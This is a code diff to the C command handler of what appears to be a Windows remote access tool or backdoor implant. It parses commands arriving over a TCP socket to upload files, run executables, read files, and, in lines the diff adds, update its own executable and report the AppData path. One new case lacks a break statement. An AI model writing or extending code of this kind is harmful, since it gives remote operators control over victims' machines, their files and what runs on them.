@@ -1,8 +1,5 @@
 #include"header.h"
-#include <windows.h>
-#include <winsock2.h>
-#include <stdio.h>
-#include <string.h>
+
 
 // 解析命令的核心函数
 ParsedCommand parsecommand(char* raw_command) {
@@ -60,6 +57,12 @@ ParsedCommand parsecommand(char* raw_command) {
     }
     else if (strcmp(cmd.params[0], "upload") == 0) {
         cmd.type = CMD_FILE_UPLOAD;
+    }
+    else if (strcmp(cmd.params[0], "update") == 0) {
+        cmd.type = CMD_UPDATE_EXE;
+    }
+    else if (strcmp(cmd.params[0], "getpath") == 0) {
+        cmd.type = CMD_GET_APPDATA_PATH;
     }
 
 
@@ -152,7 +155,7 @@ char* execute_parsed_command(ParsedCommand cmd, SOCKET tcpsock) {
 
     case CMD_RUN:
         if (cmd.num_params >= 2) {
-            if (run_executable(cmd.params[1]) == 0) {
+            if (run_executable(cmd.params[1], SW_SHOWNORMAL) == 0) {
                 output = _strdup("Execute succeeded");
             }
             else{
@@ -177,6 +180,22 @@ char* execute_parsed_command(ParsedCommand cmd, SOCKET tcpsock) {
         output = cat_file(cmd.params[1]);
         break;
 
+    case CMD_UPDATE_EXE:
+        if (update_exe(cmd.params[1]) == 0) {
+            output = _strdup("UPDATE succeeded");
+        }
+        else {
+            output = _strdup("UPDATE failed");
+        }
+        break;
+
+    case CMD_GET_APPDATA_PATH: {
+        //wchar_t *path = (wchar_t*)malloc(sizeof(wchar_t) * MAX_PATH);
+        //get_appdata_path(path, MAX_PATH);
+        //output = path;
+        //break;
+        output = _strdup("Unicode processing not implemented.");
+    }
 
 
 
